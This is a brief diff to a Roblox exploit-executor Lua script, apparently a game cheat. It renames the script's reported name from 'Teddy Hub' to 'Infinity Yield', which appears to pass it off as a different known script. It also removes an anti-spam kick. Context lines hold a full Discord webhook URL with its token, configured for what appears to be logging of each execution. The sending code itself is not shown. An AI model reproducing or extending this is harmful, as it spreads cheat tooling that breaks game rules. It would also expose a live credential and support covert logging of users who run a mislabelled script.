@@ -1,4 +1,4 @@
-getgenv().whscript = "Teddy Hub"
+getgenv().whscript = "Infinity Yield"
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1505570680261841048/U66Kn8uV97g99DKlBzA5xE4YXA5glRy-Zji83dFkE47kpBMaIfY_2vfz5zvHSAoFED-f"
 getgenv().ExecLogSecret = false
 
@@ -15,7 +15,7 @@ if ui:FindFirstChild(folderName) then
     local folder2 = Instance.new("Folder")
     folder2.Name = folderName2
     if ui2:FindFirstChild(folderName2) then
-        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
+        
     else
         folder2.Parent = gethui()
     end
